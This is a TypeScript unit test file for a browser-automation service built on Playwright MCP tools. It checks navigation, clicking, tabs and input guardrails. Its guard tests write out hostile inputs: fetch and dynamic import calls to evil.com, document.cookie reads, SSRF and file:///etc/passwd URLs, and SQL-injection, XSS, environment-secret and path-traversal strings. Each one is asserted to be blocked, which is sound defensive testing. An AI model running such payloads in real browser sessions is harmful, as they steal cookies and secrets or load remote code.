import * as assert from "assert";
import * as sinon from "sinon";
import { BrowserService } from "../../services/browser.service";
import { MCPService } from "../../MCP/service";
import { MCPToolResult } from "../../MCP/types";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function resetSingleton(): void {
  BrowserService.dispose();
}

function successResult(text: string): MCPToolResult {
  return {
    content: [{ type: "text", text }],
    isError: false,
  };
}

function errorResult(text: string): MCPToolResult {
  return {
    content: [{ type: "text", text }],
    isError: true,
  };
}

function imageResult(): MCPToolResult {
  return {
    content: [
      { type: "image", data: "iVBORw0KGgo=", mimeType: "image/png" },
      { type: "text", text: "Screenshot taken" },
    ],
    isError: false,
  };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

suite("BrowserService", () => {
  let sandbox: sinon.SinonSandbox;
  let callToolStub: sinon.SinonStub;

  setup(() => {
    sandbox = sinon.createSandbox();
    resetSingleton();

    // Stub MCPService.getInstance to return a mock
    const mockMCP = {
      callTool: sandbox.stub().resolves(successResult("OK")),
    };
    callToolStub = mockMCP.callTool;
    sandbox.stub(MCPService, "getInstance").returns(mockMCP as any);
  });

  teardown(() => {
    sandbox.restore();
    resetSingleton();
  });

  // ── navigate ────────────────────────────────────────────────────────

  test("navigate calls MCP with validated URL", async () => {
    // First call: browser_navigate, second call: post-nav hostname check
    callToolStub
      .onFirstCall()
      .resolves(successResult("Navigated to https://example.com/"))
      .onSecondCall()
      .resolves(successResult("example.com"));
    const svc = BrowserService.getInstance();
    const result = await svc.navigate("https://example.com");

    assert.ok(result.success);
    assert.ok(result.content.includes("example.com"));
    assert.strictEqual(callToolStub.firstCall.args[0], "browser_navigate");
    assert.strictEqual(callToolStub.firstCall.args[2], "playwright");
  });

  test("navigate blocks SSRF URLs", async () => {
    const svc = BrowserService.getInstance();
    await assert.rejects(
      () => svc.navigate("http://127.0.0.1:3000"),
      /SSRF protection/,
    );
    assert.ok(callToolStub.notCalled);
  });

  test("navigate blocks non-HTTP protocols", async () => {
    const svc = BrowserService.getInstance();
    await assert.rejects(
      () => svc.navigate("file:///etc/passwd"),
      /Disallowed protocol/,
    );
    assert.ok(callToolStub.notCalled);
  });

  // ── click ───────────────────────────────────────────────────────────

  test("click calls browser_click with ref", async () => {
    callToolStub.resolves(successResult("Clicked"));
    const svc = BrowserService.getInstance();
    const result = await svc.click("button[0]");

    assert.ok(result.success);
    assert.strictEqual(callToolStub.firstCall.args[0], "browser_click");
    assert.deepStrictEqual(callToolStub.firstCall.args[1], { ref: "button[0]" });
  });

  // ── type ────────────────────────────────────────────────────────────

  test("type calls browser_type with ref and text", async () => {
    callToolStub.resolves(successResult("Typed"));
    const svc = BrowserService.getInstance();
    await svc.type("input[0]", "hello world");

    assert.strictEqual(callToolStub.firstCall.args[0], "browser_type");
    assert.deepStrictEqual(callToolStub.firstCall.args[1], {
      ref: "input[0]",
      text: "hello world",
    });
  });

  // ── screenshot ──────────────────────────────────────────────────────

  test("screenshot returns image data when present", async () => {
    callToolStub.resolves(imageResult());
    const svc = BrowserService.getInstance();
    const result = await svc.screenshot();

    assert.ok(result.success);
    assert.ok(result.imageData);
    assert.strictEqual(result.imageData!.mimeType, "image/png");
    assert.strictEqual(result.imageData!.base64, "iVBORw0KGgo=");
    assert.ok(result.content.includes("Screenshot taken"));
  });

  // ── snapshot ────────────────────────────────────────────────────────

  test("snapshot calls browser_snapshot", async () => {
    callToolStub.resolves(
      successResult("- heading 'Welcome'\n- button 'Login' [ref=btn0]"),
    );
    const svc = BrowserService.getInstance();
    const result = await svc.snapshot();

    assert.ok(result.success);
    assert.ok(result.content.includes("heading"));
    assert.strictEqual(callToolStub.firstCall.args[0], "browser_snapshot");
  });

  // ── evaluate ────────────────────────────────────────────────────────

  test("evaluate calls browser_evaluate with expression", async () => {
    callToolStub.resolves(successResult("42"));
    const svc = BrowserService.getInstance();
    const result = await svc.evaluate("1 + 41");

    assert.ok(result.success);
    assert.strictEqual(result.content, "42");
    assert.deepStrictEqual(callToolStub.firstCall.args[1], {
      expression: "1 + 41",
    });
  });

  // ── error handling ──────────────────────────────────────────────────

  test("returns error when MCP returns isError", async () => {
    callToolStub.resolves(errorResult("Page not found"));
    const svc = BrowserService.getInstance();
    const result = await svc.navigate("https://example.com");

    assert.strictEqual(result.success, false);
    assert.ok(result.content.includes("Page not found"));
  });

  // ── pressKey ────────────────────────────────────────────────────────

  test("pressKey calls browser_press_key", async () => {
    callToolStub.resolves(successResult("Pressed Enter"));
    const svc = BrowserService.getInstance();
    await svc.pressKey("Enter");

    assert.strictEqual(callToolStub.firstCall.args[0], "browser_press_key");
    assert.deepStrictEqual(callToolStub.firstCall.args[1], { key: "Enter" });
  });

  // ── hover ───────────────────────────────────────────────────────────

  test("hover calls browser_hover", async () => {
    callToolStub.resolves(successResult("Hovered"));
    const svc = BrowserService.getInstance();
    await svc.hover("link[2]");

    assert.strictEqual(callToolStub.firstCall.args[0], "browser_hover");
    assert.deepStrictEqual(callToolStub.firstCall.args[1], { ref: "link[2]" });
  });

  // ── tab management ──────────────────────────────────────────────────

  test("tabNew with URL validates SSRF", async () => {
    const svc = BrowserService.getInstance();
    await assert.rejects(
      () => svc.tabNew("http://10.0.0.1"),
      /SSRF protection/,
    );
  });

  test("tabNew without URL opens blank tab", async () => {
    callToolStub.resolves(successResult("New tab opened"));
    const svc = BrowserService.getInstance();
    await svc.tabNew();

    assert.strictEqual(callToolStub.firstCall.args[0], "browser_tab_new");
    assert.deepStrictEqual(callToolStub.firstCall.args[1], {});
  });

  // ── wait ────────────────────────────────────────────────────────────

  test("wait calls browser_wait with time", async () => {
    callToolStub.resolves(successResult("Waited 3000ms"));
    const svc = BrowserService.getInstance();
    await svc.wait(3000);

    assert.strictEqual(callToolStub.firstCall.args[0], "browser_wait");
    assert.deepStrictEqual(callToolStub.firstCall.args[1], { time: 3000 });
  });

  test("wait rejects negative time", async () => {
    const svc = BrowserService.getInstance();
    const result = await svc.wait(-1000);
    assert.strictEqual(result.success, false);
    assert.ok(result.content.includes("Error"));
    assert.ok(callToolStub.notCalled);
  });

  test("wait rejects NaN", async () => {
    const svc = BrowserService.getInstance();
    const result = await svc.wait(NaN);
    assert.strictEqual(result.success, false);
    assert.ok(callToolStub.notCalled);
  });

  test("wait clamps to maximum", async () => {
    callToolStub.resolves(successResult("Waited"));
    const svc = BrowserService.getInstance();
    await svc.wait(9_999_999);
    const calledTime = callToolStub.firstCall.args[1].time;
    assert.ok(calledTime <= 30_000, `Expected clamped value, got ${calledTime}`);
  });

  // ── selectOption ──────────────────────────────────────────────────────

  test("selectOption calls browser_select_option with values array", async () => {
    callToolStub.resolves(successResult("Selected"));
    const svc = BrowserService.getInstance();
    await svc.selectOption("select[0]", "option-value");

    assert.strictEqual(callToolStub.firstCall.args[0], "browser_select_option");
    assert.deepStrictEqual(callToolStub.firstCall.args[1], {
      ref: "select[0]",
      values: ["option-value"],
    });
  });

  // ── goBack / goForward ──────────────────────────────────────────────

  test("goBack calls browser_go_back", async () => {
    callToolStub.resolves(successResult("Navigated back"));
    const svc = BrowserService.getInstance();
    await svc.goBack();
    assert.strictEqual(callToolStub.firstCall.args[0], "browser_go_back");
  });

  test("goForward calls browser_go_forward", async () => {
    callToolStub.resolves(successResult("Navigated forward"));
    const svc = BrowserService.getInstance();
    await svc.goForward();
    assert.strictEqual(callToolStub.firstCall.args[0], "browser_go_forward");
  });

  // ── tabClose ──────────────────────────────────────────────────────────

  test("tabClose calls browser_tab_close (not browser_close)", async () => {
    callToolStub.resolves(successResult("Tab closed"));
    const svc = BrowserService.getInstance();
    await svc.tabClose();
    assert.strictEqual(callToolStub.firstCall.args[0], "browser_tab_close");
  });

  // ── tabList ──────────────────────────────────────────────────────────

  test("tabList calls browser_tab_list", async () => {
    callToolStub.resolves(successResult("Tab 1: https://example.com"));
    const svc = BrowserService.getInstance();
    await svc.tabList();
    assert.strictEqual(callToolStub.firstCall.args[0], "browser_tab_list");
  });

  // ── evaluate guardrails ──────────────────────────────────────────────

  test("evaluate rejects expressions exceeding max length", async () => {
    const svc = BrowserService.getInstance();
    const result = await svc.evaluate("x".repeat(5000));
    assert.strictEqual(result.success, false);
    assert.ok(result.content.includes("maximum length"));
    assert.ok(callToolStub.notCalled);
  });

  // ── evaluate content guards ────────────────────────────────────────

  test("evaluate blocks fetch() calls", async () => {
    const svc = BrowserService.getInstance();
    const result = await svc.evaluate("fetch('https://evil.com')");
    assert.strictEqual(result.success, false);
    assert.ok(result.content.includes("blocked pattern"));
    assert.ok(callToolStub.notCalled);
  });

  test("evaluate blocks XMLHttpRequest", async () => {
    const svc = BrowserService.getInstance();
    const result = await svc.evaluate("new XMLHttpRequest()");
    assert.strictEqual(result.success, false);
    assert.ok(result.content.includes("blocked pattern"));
    assert.ok(callToolStub.notCalled);
  });

  test("evaluate blocks document.cookie", async () => {
    const svc = BrowserService.getInstance();
    const result = await svc.evaluate("document.cookie");
    assert.strictEqual(result.success, false);
    assert.ok(result.content.includes("blocked pattern"));
  });

  test("evaluate blocks dynamic import()", async () => {
    const svc = BrowserService.getInstance();
    const result = await svc.evaluate("import('https://evil.com/payload.js')");
    assert.strictEqual(result.success, false);
    assert.ok(result.content.includes("blocked pattern"));
  });

  test("evaluate allows safe expressions", async () => {
    callToolStub.resolves(successResult("42"));
    const svc = BrowserService.getInstance();
    const result = await svc.evaluate("document.title");
    assert.ok(result.success);
    assert.strictEqual(result.content, "42");
  });

  // ── input guard on ref/key ──────────────────────────────────────────

  test("click rejects malicious ref", async () => {
    const svc = BrowserService.getInstance();
    await assert.rejects(
      () => svc.click("'; DROP TABLE users; --"),
      /Invalid ref parameter/,
    );
    assert.ok(callToolStub.notCalled);
  });

  test("type rejects malicious ref", async () => {
    const svc = BrowserService.getInstance();
    await assert.rejects(
      () => svc.type("<script>alert(1)</script>", "text"),
      /Invalid ref parameter/,
    );
    assert.ok(callToolStub.notCalled);
  });

  test("hover rejects malicious ref", async () => {
    const svc = BrowserService.getInstance();
    await assert.rejects(
      () => svc.hover("${process.env.SECRET}"),
      /Invalid ref parameter/,
    );
  });

  test("pressKey rejects invalid key", async () => {
    const svc = BrowserService.getInstance();
    await assert.rejects(
      () => svc.pressKey("A".repeat(100)),
      /Invalid key parameter/,
    );
    assert.ok(callToolStub.notCalled);
  });

  test("selectOption rejects malicious ref", async () => {
    const svc = BrowserService.getInstance();
    await assert.rejects(
      () => svc.selectOption("../../etc/passwd", "val"),
      /Invalid ref parameter/,
    );
  });

  // ── singleton & dispose ─────────────────────────────────────────────

  test("getInstance returns same instance", () => {
    const a = BrowserService.getInstance();
    const b = BrowserService.getInstance();
    assert.strictEqual(a, b);
  });

  test("dispose resets singleton", () => {
    const a = BrowserService.getInstance();
    BrowserService.dispose();
    const b = BrowserService.getInstance();
    assert.notStrictEqual(a, b);
  });
});
